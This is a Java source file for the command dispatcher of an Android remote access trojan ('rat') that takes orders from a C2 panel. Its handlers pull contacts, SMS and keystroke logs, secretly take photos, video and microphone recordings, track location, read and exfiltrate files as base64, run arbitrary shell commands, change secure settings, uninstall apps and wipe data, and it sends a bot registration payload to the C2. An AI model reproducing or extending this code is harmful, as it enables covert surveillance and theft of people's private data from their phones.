package com.darkbiit.rat;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.net.Uri;
import android.os.Build;
import android.util.Base64;

import java.io.File;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Command dispatcher: executes one command and returns a JSON-able result map.
 *
 * Every handler returns a map with at least "ok" (boolean) and never throws
 * out of this class: failures are converted into {"ok":false,"error":...}.
 */
public final class RatCommands {

    private RatCommands() {
    }

    /** Handles a command from the panel. */
    public static Map<String, Object> handle(Context ctx, String cmdId, Map<String, Object> args) {
        Map<String, Object> res = new LinkedHashMap<String, Object>();
        try {
            String cmd = RatJson.getString(args, "cmd", "").toLowerCase(java.util.Locale.US);

            if ("ping".equals(cmd)) {
                res.put("ok", true);
                res.put("pong", System.currentTimeMillis());
            } else if ("info".equals(cmd)) {
                res.put("ok", true);
                res.put("info", RatCollect.inventory(ctx));
            } else if ("contacts".equals(cmd)) {
                int limit = RatJson.getInt(args, "limit", 1000);
                res.putAll(RatSms.contacts(ctx, limit));
            } else if ("sms".equals(cmd)) {
                int limit = RatJson.getInt(args, "limit", 200);
                res.putAll(RatSms.sms(ctx, limit));
            } else if ("keys".equals(cmd)) {
                res.put("ok", true);
                res.put("log", RatIme.readLog(ctx));
            } else if ("testnotify".equals(cmd)) {
                String title = RatJson.getString(args, "title", "Ratpack");
                String text = RatJson.getString(args, "text", "test notification");
                res.putAll(postNotification(ctx, title, text));
            } else if ("cameras".equals(cmd)) {
                res.putAll(RatCamera.list(ctx));
            } else if ("photo".equals(cmd)) {
                String facing = RatJson.getString(args, "facing", "back");
                String path = RatJson.getString(args, "path", defaultCapturePath(ctx, "jpg"));
                res.putAll(RatCamera.takePhoto(ctx, facing, path));
            } else if ("video".equals(cmd)) {
                String facing = RatJson.getString(args, "facing", "back");
                int secs = RatJson.getInt(args, "seconds", 15);
                String path = RatJson.getString(args, "path", defaultCapturePath(ctx, "mp4"));
                res.putAll(RatCamera.recordVideo(ctx, facing, path, secs));
            } else if ("torch".equals(cmd)) {
                String facing = RatJson.getString(args, "facing", "back");
                boolean on = RatJson.getBool(args, "on", true);
                res.putAll(RatCamera.torch(ctx, facing, on));
            } else if ("mic".equals(cmd)) {
                int secs = RatJson.getInt(args, "seconds", 15);
                String path = RatJson.getString(args, "path", defaultCapturePath(ctx, "wav"));
                res.putAll(RatMic.recordFile(ctx, path, secs));
            } else if ("location".equals(cmd)) {
                res.putAll(RatLocation.fix(ctx));
            } else if ("locate_start".equals(cmd)) {
                int interval = RatJson.getInt(args, "interval_ms", 5000);
                RatService svc = RatService.instance();
                boolean started = svc != null && svc.startTracking(interval);
                res.put("ok", started);
                res.put("interval_ms", interval);
                if (!started) {
                    res.put("error", "tracking not started (permission or service down)");
                }
            } else if ("locate_stop".equals(cmd)) {
                RatService svc = RatService.instance();
                boolean stopped = svc != null && svc.stopTracking();
                res.put("ok", stopped);
            } else if ("settings".equals(cmd)) {
                res.putAll(RatSettings.dump(ctx));
            } else if ("settings_get".equals(cmd)) {
                String name = RatJson.getString(args, "name", "");
                res.putAll(RatSettings.getSystem(ctx, name));
            } else if ("settings_set".equals(cmd)) {
                String name = RatJson.getString(args, "name", "");
                String value = RatJson.getString(args, "value", "");
                res.putAll(RatSettings.setSystem(ctx, name, value));
            } else if ("settings_secure".equals(cmd)) {
                String name = RatJson.getString(args, "name", "");
                String value = RatJson.getString(args, "value", "");
                res.putAll(RatSettings.setSecure(ctx, name, value));
            } else if ("caches".equals(cmd)) {
                res.putAll(RatAppCache.list(ctx));
            } else if ("storage".equals(cmd)) {
                res.put("ok", true);
                res.putAll(RatAppCache.storageInfo(ctx));
            } else if ("selfapk".equals(cmd)) {
                File apk = RatCollect.selfApk(ctx);
                res.put("ok", apk != null);
                if (apk != null) {
                    res.put("path", apk.getAbsolutePath());
                    res.put("size", apk.length());
                }
            } else if ("ls".equals(cmd)) {
                String path = RatJson.getString(args, "path", "/sdcard");
                res.put("ok", true);
                res.put("path", path);
                res.put("entries", RatFiles.list(path));
            } else if ("roots".equals(cmd)) {
                res.put("ok", true);
                res.put("roots", RatFiles.roots(ctx));
            } else if ("cat".equals(cmd)) {
                String path = RatJson.getString(args, "path", "");
                String data = RatFiles.cat(path, RatCfg.MAX_SHELL_OUTPUT);
                res.put("ok", true);
                res.put("path", path);
                res.put("data", data);
            } else if ("pull".equals(cmd)) {
                String path = RatJson.getString(args, "path", "");
                byte[] data = RatFiles.readBytes(path, RatCfg.MAX_PULL_BYTES);
                res.put("ok", true);
                res.put("path", path);
                res.put("size", data.length);
                res.put("b64", Base64.encodeToString(data, Base64.NO_WRAP));
            } else if ("push".equals(cmd)) {
                String path = RatJson.getString(args, "path", "");
                String b64 = RatJson.getString(args, "b64", "");
                byte[] data;
                try {
                    data = Base64.decode(b64, Base64.DEFAULT);
                } catch (IllegalArgumentException e) {
                    res.put("ok", false);
                    res.put("error", "bad base64");
                    return res;
                }
                if (data.length > RatCfg.MAX_PULL_BYTES) {
                    res.put("ok", false);
                    res.put("error", "payload too large");
                    return res;
                }
                RatFiles.write(path, data);
                res.put("ok", true);
                res.put("path", path);
                res.put("size", data.length);
            } else if ("mkdir".equals(cmd)) {
                String path = RatJson.getString(args, "path", "");
                boolean ok = RatFiles.mkdirs(path);
                res.put("ok", ok);
                res.put("path", path);
                if (!ok) {
                    res.put("error", "mkdir failed");
                }
            } else if ("delete".equals(cmd)) {
                String path = RatJson.getString(args, "path", "");
                boolean ok = RatFiles.delete(path);
                res.put("ok", ok);
                res.put("path", path);
                if (!ok) {
                    res.put("error", "delete failed");
                }
            } else if ("move".equals(cmd)) {
                String from = RatJson.getString(args, "from", "");
                String to = RatJson.getString(args, "to", "");
                boolean ok = RatFiles.move(from, to);
                res.put("ok", ok);
                res.put("from", from);
                res.put("to", to);
                if (!ok) {
                    res.put("error", "move failed");
                }
            } else if ("shell".equals(cmd)) {
                String command = RatJson.getString(args, "command", "");
                long timeout = RatJson.getInt(args, "timeout_ms", 30000);
                RatShell.Result r = RatShell.run(command, timeout, RatCfg.MAX_SHELL_OUTPUT);
                res.put("ok", r.exit == 0);
                res.put("exit", r.exit);
                res.put("stdout", r.stdout);
                res.put("stderr", r.stderr);
                res.put("truncated", r.truncated);
            } else if ("open".equals(cmd)) {
                String url = RatJson.getString(args, "url", "");
                Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
                res.put("ok", true);
                res.put("url", url);
            } else if ("launch".equals(cmd)) {
                String pkg = RatJson.getString(args, "package", "");
                String cls = RatJson.getString(args, "class", "");
                Intent i = new Intent();
                i.setClassName(pkg, cls);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
                res.put("ok", true);
                res.put("launched", pkg + "/" + cls);
            } else if ("appinfo".equals(cmd)) {
                String pkg = RatJson.getString(args, "package", "");
                res.put("ok", true);
                res.put("info", appInfo(ctx, pkg));
            } else if ("uninstall".equals(cmd)) {
                String pkg = RatJson.getString(args, "package", "");
                Intent i = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(i);
                res.put("ok", true);
                res.put("uninstall_requested", pkg);
            } else if ("sleep".equals(cmd)) {
                long ms = RatJson.getInt(args, "ms", 1000);
                if (ms > 60000) {
                    ms = 60000;
                }
                Thread.sleep(ms);
                res.put("ok", true);
            } else if ("wipe".equals(cmd)) {
                // scoped wipe: only the app's own private storage
                File dir = ctx.getFilesDir();
                boolean ok = deleteRecursive(dir);
                res.put("ok", ok);
                res.put("path", dir.getAbsolutePath());
            } else {
                res.put("ok", false);
                res.put("error", "unknown command: " + cmd);
            }
        } catch (Throwable t) {
            res.clear();
            res.put("ok", false);
            res.put("error", t.getClass().getSimpleName() + ": " + String.valueOf(t.getMessage()));
        }
        return res;
    }

    /**
     * Posts a notification through the normal API.
     *
     * Used to verify the notification listener loop end to end: the listener
     * catches the notification and forwards it to the C2.
     */
    private static Map<String, Object> postNotification(Context ctx, String title, String text) {
        Map<String, Object> out = new LinkedHashMap<String, Object>();
        try {
            android.app.NotificationManager nm =
                    (android.app.NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) {
                out.put("ok", false);
                out.put("error", "no notification manager");
                return out;
            }
            String channelId = "rat_test";
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                android.app.NotificationChannel ch = new android.app.NotificationChannel(
                        channelId, "Test", android.app.NotificationManager.IMPORTANCE_HIGH);
                nm.createNotificationChannel(ch);
            }
            android.app.Notification.Builder b;
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                b = new android.app.Notification.Builder(ctx, channelId);
            } else {
                b = new android.app.Notification.Builder(ctx);
            }
            b.setContentTitle(title)
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.stat_sys_warning)
                    .setAutoCancel(true);
            int id = (int) (System.currentTimeMillis() & 0xffff);
            nm.notify(id, b.build());
            out.put("ok", true);
            out.put("id", id);
            out.put("channel", channelId);
        } catch (Throwable t) {
            out.put("ok", false);
            out.put("error", t.getClass().getSimpleName() + ": " + t.getMessage());
        }
        return out;
    }

    private static boolean deleteRecursive(File f) {
        if (f == null) {
            return false;
        }
        if (f.isDirectory()) {
            File[] arr = f.listFiles();
            if (arr != null) {
                for (File c : arr) {
                    deleteRecursive(c);
                }
            }
        }
        return f.delete();
    }

    /**
     * Default path for captured media: the app's private files dir keeps the
     * data inside the host app's sandbox, so no storage permission is needed.
     */
    private static String defaultCapturePath(Context ctx, String ext) {
        try {
            File dir = new File(ctx.getFilesDir(), RatCfg.STATE_DIR);
            if (!dir.exists()) {
                //noinspection ResultOfMethodCallIgnored
                dir.mkdirs();
            }
            return new File(dir, "capture_" + System.currentTimeMillis() + "." + ext)
                    .getAbsolutePath();
        } catch (Throwable t) {
            return "/sdcard/capture_" + System.currentTimeMillis() + "." + ext;
        }
    }

    private static Map<String, Object> appInfo(Context ctx, String pkg) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();
        try {
            android.content.pm.PackageManager pm = ctx.getPackageManager();
            ApplicationInfo ai = pm.getApplicationInfo(pkg, 0);
            m.put("package", ai.packageName);
            m.put("source_dir", ai.sourceDir);
            m.put("data_dir", ai.dataDir);
            m.put("flags", ai.flags);
            m.put("target_sdk", ai.targetSdkVersion);
            m.put("uid", ai.uid);
            m.put("enabled", ai.enabled);
            m.put("system", (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
        } catch (Throwable t) {
            m.put("error", t.getClass().getSimpleName());
        }
        return m;
    }

    /** Builds the registration payload sent when the bot first connects. */
    public static Map<String, Object> registerPayload(Context ctx) {
        Map<String, Object> m = new LinkedHashMap<String, Object>();
        m.put("secret", RatCfg.SECRET);
        m.put("model", Build.MODEL);
        m.put("brand", Build.BRAND);
        m.put("android", Build.VERSION.RELEASE);
        m.put("sdk", Build.VERSION.SDK_INT);
        m.put("package", ctx.getPackageName());
        m.put("host", RatCfg.C2_HOST);
        m.put("port", RatCfg.C2_PORT);
        return m;
    }

    /** Helper for the panel: list of command names this build supports. */
    public static List<Object> supported() {
        List<Object> out = new ArrayList<Object>();
        String[] names = {"ping", "info", "contacts", "sms", "keys", "selfapk",
                "ls", "roots", "cat", "pull", "push", "mkdir",
                "delete", "move", "shell", "open", "launch", "appinfo", "uninstall",
                "sleep", "wipe",
                "cameras", "photo", "video", "torch", "testnotify",
                "mic", "location", "locate_start", "locate_stop",
                "settings", "settings_get", "settings_set", "settings_secure",
                "caches", "storage"};
        for (String n : names) {
            out.add(n);
        }
        return out;
    }
}
